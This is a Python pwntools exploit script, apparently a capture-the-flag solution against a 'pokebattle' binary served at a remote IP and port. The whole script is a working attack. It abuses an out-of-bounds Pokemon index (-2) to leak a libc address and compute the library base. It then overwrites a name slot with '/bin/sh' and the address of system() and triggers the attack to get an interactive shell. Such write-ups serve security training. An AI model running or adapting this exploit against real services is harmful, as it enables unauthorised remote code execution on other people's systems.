from pwn import *
from sys import argv
from time import sleep

context.log_level = "info"

binfile = "./pokebattle"

elf = ELF(binfile)

if len(argv) >= 2 and argv[1] == "d":
    p = gdb.debug(binfile, '''
        break attack
        continue
    ''')
else:
    p = remote("114.177.250.4", 2225)

# leak libc addr
p.recvuntil("> ")
p.sendline("4")
p.recvuntil("Select Pokemon : \n")
p.sendline("-2")
p.recvuntil("Go ")
libc_main = u64(p.recv(6).ljust(8, b"\x00"))
log.info("libc_main: 0x{:08x}".format(libc_main))
libc_off = 0x21ab0
libc_base = libc_main - libc_off
log.info("libc_base: 0x{:08x}".format(libc_base))

# reset now_selected
p.recvuntil("> ")
p.sendline("4")
p.recvuntil("Select Pokemon : \n")
p.sendline("0")

one_shot = 0x10a38c
one_gadget = libc_base + one_shot
system_addr = libc_base + 0x4f440

payload = b""
payload += b"/bin/sh\x00"      # /bin/sh\x00
payload += b"A" * (40-8)       # padding
payload += p64(system_addr)    # system

p.recvuntil("> ")
p.sendline("2")
p.recvuntil("slot : \n")
p.sendline("0")
p.recvuntil("name : \n")
p.sendline(payload)

# attak
p.recvuntil("> ")
p.sendline("1")

p.interactive()
